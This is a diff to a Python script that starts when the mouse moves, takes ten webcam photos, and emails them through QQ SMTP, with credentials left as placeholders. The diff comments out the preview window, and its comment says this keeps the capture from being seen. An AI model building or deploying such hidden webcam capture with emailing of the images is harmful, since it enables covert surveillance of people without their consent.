@@ -6,6 +6,7 @@
 # Software   : PyCharm
 # =======Here We Go!=======
 
+# README：程序中标注的“xxx”是需要自己进行设置的
 
 import cv2
 from pynput.mouse import Listener
@@ -29,8 +30,8 @@ def send_mail():
     mail_sender='xxx@qq.com'
     # 设置发送方邮箱密码
     mail_pass="xxx" #自助查询-设备管理-自动发送邮件
-    # 设置接受方邮箱
-    mail_receiver=['xxx@qq.com','xxx@qq.com']
+    # 设置接收方邮箱
+    mail_receiver='xxx@qq.com'
     # mail_receiver['xxx.qq.com','xxx.163.com','xxx.outlook.com'] # 设置多个接收方
 
     yag = yagmail.SMTP(user=mail_sender,password=mail_pass,host=mail_host)
@@ -74,7 +75,7 @@ if __name__=="__main__":
     while(cap.isOpened()): # 当摄像头被打开时，循环捕捉帧
         while(num<11): # 设置拍摄10张照片
             ret_flag, image_show = cap.read()  # 函数返回值是有两个参数
-            cv2.imshow("Capture", image_show)  # 创建窗口，窗口的显示值为捕捉的图像，名称为Capture
+            # cv2.imshow("Capture", image_show)  # 创建窗口，窗口的显示值为捕捉的图像，名称为Capture。这句话注释了之后则不会显示拍照的窗口
             if mouse_return!=0:  # 当鼠标发生移动时触发程序
                 # 设置窗口大小
                 cap.get(4)
